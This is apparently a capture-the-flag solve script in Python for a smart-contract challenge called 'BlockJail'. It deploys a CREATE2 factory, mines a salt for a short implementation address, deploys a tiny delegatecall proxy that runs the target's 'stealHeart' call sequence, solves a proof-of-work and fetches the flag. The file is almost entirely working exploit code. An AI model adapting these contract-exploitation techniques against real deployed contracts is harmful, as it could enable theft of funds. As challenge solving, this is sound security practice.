#!/usr/bin/env python3

import sys, requests
from web3 import Web3
from eth_account import Account
from eth_utils import keccak
import solcx

UINT144_MAX = (1 << 144) - 1

def build_proxy(impl_addr, push_width=18):
    b = bytes([0x5f, 0x5f, 0x5f, 0x5f])
    ab = impl_addr.to_bytes(20, 'big')[20-push_width:]
    b += bytes([0x5f+push_width]) + ab
    b += bytes([0x5a, 0xf4, 0x00])
    return b

def init_wrapper(runtime):
    L = len(runtime)
    pre = bytes([0x60, L, 0x60, 0x0c, 0x60, 0x00, 0x39, 0x60, L, 0x60, 0x00, 0xf3])
    assert len(pre) == 12
    return pre + runtime

def create2_addr(deployer, salt, init_code):
    d = deployer.to_bytes(20, 'big'); s = salt.to_bytes(32, 'big')
    h = keccak(b'\xff' + d + s + keccak(init_code))
    return int.from_bytes(h[12:], 'big')

def mine_vanity(deployer, init_code, max_iter=5_000_000):
    for salt in range(max_iter):
        a = create2_addr(deployer, salt, init_code)
        if a <= UINT144_MAX:
            return salt, a
    raise RuntimeError("no salt")

FACTORY_SRC = '''
pragma solidity 0.8.30;
contract F {
    function dep(bytes32 salt, bytes memory code) external returns (address a) {
        assembly { a := create2(0, add(code, 0x20), mload(code), salt) }
    }
}
'''

IMPL_SRC = '''
pragma solidity 0.8.30;
interface IBlockJail {
    function enter() external;
    function openPath() external;
    function infiltrate(bytes calldata card) external;
    function stealHeart() external;
}
contract Impl {
    address immutable T;
    constructor(address t) { T = t; }
    fallback() external payable {
        IBlockJail t = IBlockJail(T);
        t.enter();
        t.openPath();
        t.infiltrate(hex"0001030001");
        t.stealHeart();
    }
}
'''

def compile_src(src, name):
    solcx.install_solc("0.8.30")
    out = solcx.compile_source(src, solc_version="0.8.30", output_values=["abi", "bin"])
    for k, v in out.items():
        if k.endswith(":" + name):
            return v["abi"], bytes.fromhex(v["bin"])
    raise RuntimeError("compile miss " + name)

def send(w3, acct, tx):
    tx.setdefault("gas", 3_000_000)
    tx["nonce"] = w3.eth.get_transaction_count(acct.address)
    tx["from"] = acct.address
    tx["gasPrice"] = w3.eth.gas_price
    signed = acct.sign_transaction(tx)
    h = w3.eth.send_raw_transaction(signed.raw_transaction)
    return w3.eth.wait_for_transaction_receipt(h)

def run_exploit(rpc, pk, setup_addr):
    w3 = Web3(Web3.HTTPProvider(rpc))
    acct = Account.from_key(pk)
    setup_abi = [
        {"name": "TARGET", "outputs": [{"type": "address"}], "inputs": [], "stateMutability": "view", "type": "function"},
        {"name": "PALACE", "outputs": [{"type": "address"}], "inputs": [], "stateMutability": "view", "type": "function"},
        {"name": "isSolved", "outputs": [{"type": "bool"}], "inputs": [], "stateMutability": "view", "type": "function"},
    ]
    setup = w3.eth.contract(address=Web3.to_checksum_address(setup_addr), abi=setup_abi)
    target = setup.functions.TARGET().call()
    palace = setup.functions.PALACE().call()
    print("[+] TARGET", target)
    print("[+] PALACE", palace)

    fac_abi, fac_bin = compile_src(FACTORY_SRC, "F")
    impl_abi, impl_bin = compile_src(IMPL_SRC, "Impl")

    rc = send(w3, acct, {"data": "0x" + fac_bin.hex()})
    factory = rc.contractAddress
    print("[+] factory", factory)

    impl_init = impl_bin + bytes.fromhex(target[2:].rjust(64, "0"))
    salt, mined = mine_vanity(int(factory, 16), impl_init)
    print("[+] mined salt", salt, "->", hex(mined))
    assert mined <= UINT144_MAX

    fac = w3.eth.contract(address=factory, abi=fac_abi)
    send(w3, acct, {"to": factory, "data": fac.encode_abi("dep", args=[salt.to_bytes(32, "big"), impl_init])})
    impl_addr = Web3.to_checksum_address(hex(mined))
    assert len(w3.eth.get_code(impl_addr)) > 0
    print("[+] impl deployed at", impl_addr)

    runtime = build_proxy(mined)
    assert len(runtime) <= 36
    proxy_init = init_wrapper(runtime)
    rc = send(w3, acct, {"data": "0x" + proxy_init.hex()})
    proxy = rc.contractAddress
    print("[+] agent proxy", proxy, "runtime", len(runtime), "bytes")

    send(w3, acct, {"to": proxy, "data": "0x"})
    solved = setup.functions.isSolved().call()
    print("[+] isSolved() =", solved)
    assert solved, "not solved, check the trace"
    return solved

def solve_pow(challenge):
    import base64
    _, db64, xb64 = challenge.split(".")
    d = int.from_bytes(base64.b64decode(db64), "big")
    x = int.from_bytes(base64.b64decode(xb64), "big")
    p = (1 << 1279) - 1
    y = x
    for _ in range(d):
        y = pow(y, (p + 1) // 4, p)
        y ^= 1
    return base64.b64encode(y.to_bytes(160, "big")).decode()

def get_instance(base):
    s = requests.Session()
    ch = s.get(base + "/challenge").text.strip()
    print("[+] got pow challenge, grinding...")
    sol = solve_pow(ch)
    s.post(base + "/solution", data={"solution": sol})
    creds = s.get(base + "/launch").json()
    print("[+] instance", creds)
    return s, creds

if __name__ == "__main__":
    rpc, pk, setup_addr = sys.argv[1], sys.argv[2], sys.argv[3]
    run_exploit(rpc, pk, setup_addr)
    if len(sys.argv) > 4:
        s, _ = get_instance(sys.argv[4])
        print("[+] FLAG:", s.get(sys.argv[4] + "/flag").text)
